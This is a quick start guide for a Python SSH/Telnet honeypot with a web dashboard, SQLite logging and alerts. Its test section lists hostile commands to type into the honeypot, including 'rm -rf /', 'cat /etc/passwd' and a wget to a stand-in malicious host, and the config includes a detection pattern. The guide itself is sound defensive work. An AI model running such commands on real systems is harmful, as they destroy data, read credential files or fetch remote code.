# Quick Start Guide - HoneyPot System

## 5-Minute Setup

### Step 1: Create Virtual Environment

```bash
# Windows
python -m venv venv
venv\Scripts\activate

# Linux/Mac
python3 -m venv venv
source venv/bin/activate
```

### Step 2: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 3: Run the Honeypot

```bash
python honeyPot.py
```

You should see:
```
2024-01-15 10:30:45 - honeypot - INFO - HoneyPot initialized
2024-01-15 10:30:45 - honeypot - INFO - Started ssh listener on port 22
2024-01-15 10:30:45 - honeypot - INFO - Started telnet listener on port 23
2024-01-15 10:30:45 - honeypot - INFO - HoneyPot is running. Press Ctrl+C to stop.
```

### Step 4: Open Dashboard (New Terminal)

```bash
# Activate virtual environment first
# Windows: venv\Scripts\activate
# Linux: source venv/bin/activate

python dashboard.py
```

You should see:
```
Starting Dashboard on http://localhost:5000
```

### Step 5: Access Dashboard

Open your browser and go to: **http://localhost:5000**

## Testing the Honeypot

### Test SSH (From another machine or local)

```bash
# Will hang as honeypot doesn't provide real auth
ssh localhost -p 22
```

### Test Telnet (From another machine)

```bash
telnet localhost 23
# Type commands and they'll be logged
cat /etc/passwd
sudo ls
exit
```

Check the dashboard - you should see:
- New sessions appearing
- Commands being logged
- Threat levels being calculated

## View Logs

```bash
# Real-time log viewing
tail -f logs/honeypot.log

# Or view in Windows:
type logs\honeypot.log
```

## Database Queries

```bash
# Open database
sqlite3 honeypot.db

# View recent sessions
SELECT client_ip, service, COUNT(*) FROM sessions GROUP BY client_ip, service;

# View all alerts
SELECT timestamp, client_ip, threat_level, message FROM alerts ORDER BY timestamp DESC LIMIT 10;

# Exit
.exit
```

## Customize Configuration

Edit `config.json` to:

1. **Change monitored ports**
   ```json
   "ports": [
     {"port": 2222, "service": "ssh"},
     {"port": 2323, "service": "telnet"}
   ]
   ```

2. **Add email alerts**
   ```json
   "alert_email": {
     "from": "your-email@gmail.com",
     "to": "admin@example.com",
     "smtp_server": "smtp.gmail.com",
     "smtp_port": 587,
     "username": "your-email@gmail.com",
     "password": "app-specific-password"
   }
   ```

3. **Add webhook alerts**
   ```json
   "alert_webhook": "https://your-webhook-url.com/honeypot"
   ```

4. **Add custom suspicious patterns**
   ```json
   "suspicious_commands": [
     "cat /etc/passwd",
     "your-custom-pattern"
   ]
   ```

## Project Files

| File | Purpose |
|------|---------|
| `honeyPot.py` | Main server - handles SSH/Telnet connections |
| `config.py` | Configuration loader |
| `database.py` | SQLite database operations |
| `logger.py` | Logging system |
| `alert_system.py` | Alert handling (email/webhook) |
| `threat_detection.py` | Threat analysis engine |
| `dashboard.py` | Flask web server |
| `dashboard.html` | Web UI |
| `config.json` | Configuration file |
| `honeypot.db` | Database (auto-created) |
| `logs/honeypot.log` | Log file (auto-created) |

## Next Steps

1. **Add email alerts**: Uncomment SMTP code in `alert_system.py`
2. **Deploy to production**: Use systemd service or Docker
3. **Monitor remotely**: Host dashboard on public IP with authentication
4. **Analyze trends**: Query database for attack patterns
5. **Integrate with SIEM**: Export logs to ELK/Splunk

## Troubleshooting

### Port Already in Use
```bash
# Windows
netstat -ano | findstr :22
taskkill /PID <PID> /F

# Linux
lsof -i :22
kill -9 <PID>
```

### Permission Denied (Linux)
```bash
# Use sudo for ports < 1024
sudo python honeyPot.py
```

### Dashboard Not Loading
- Check Python version: `python --version` (need 3.7+)
- Check port: `python dashboard.py` should show the URL
- Check firewall: Allow localhost:5000

## Example Commands to Trigger Alerts

Try these commands when connecting via Telnet:

```
cat /etc/passwd          # HIGH threat
sudo ls                  # HIGH threat
rm -rf /                 # HIGH threat
wget http://malicious.com # HIGH threat
python backdoor.py       # MEDIUM threat
normal_command           # No threat
```

## Performance Tips

- Database grows with each session - clean old data periodically:
  ```sql
  DELETE FROM sessions WHERE start_time < datetime('now', '-30 days');
  ```

- Monitor log size (rotates at 10MB automatically)

- Dashboard can handle 10,000+ sessions - use pagination

## Support

For issues or questions:
1. Check `logs/honeypot.log` for errors
2. Verify `config.json` syntax
3. Ensure all dependencies installed: `pip list`
4. Check database: `sqlite3 honeypot.db ".tables"`

---

**You're all set! Start monitoring threats today.** 🍯🛡️
